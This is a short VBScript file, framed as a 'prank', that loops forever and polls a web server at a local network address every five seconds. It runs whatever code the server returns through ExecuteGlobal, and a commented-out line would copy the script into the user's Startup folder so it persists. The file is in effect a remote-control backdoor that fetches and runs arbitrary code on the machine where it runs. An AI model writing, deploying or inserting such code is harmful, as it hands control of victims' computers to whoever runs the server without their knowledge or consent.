' C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
' 

Dim oFSO
Set oFSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = WScript.CreateObject("WScript.Shell")

' put our prank in the startup folder
' oFSO.CopyFile "annoying.vbs", "C:\Users\" + WshShell.ExpandEnvironmentStrings( "%USERNAME%" ) + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

Set WshShell = WScript.CreateObject("WScript.Shell")


Dim last, prank, cancel
last = ""
prank = ""
cancel = false
Do While cancel = false
	On Error Resume Next

	' Connect to local web server
	Set xmlhttp = createobject ("msxml2.xmlhttp.3.0")
	xmlhttp.open "get", "http://192.168.1.162:8000/getHack/test", false
	xmlhttp.send

	' Find code to run
	prank = xmlhttp.responseText
	' prank = split(xmlhttp.responseText,"<body>")(1)
	' prank = split(prank,"</body>")(0)

	' If website is updated, run the new prank
	If StrComp(last, prank) <> 0 Then
		last = prank
		ExecuteGlobal prank
	End If

	' Check the server every 5 seconds
	WScript.Sleep 5000

Loop



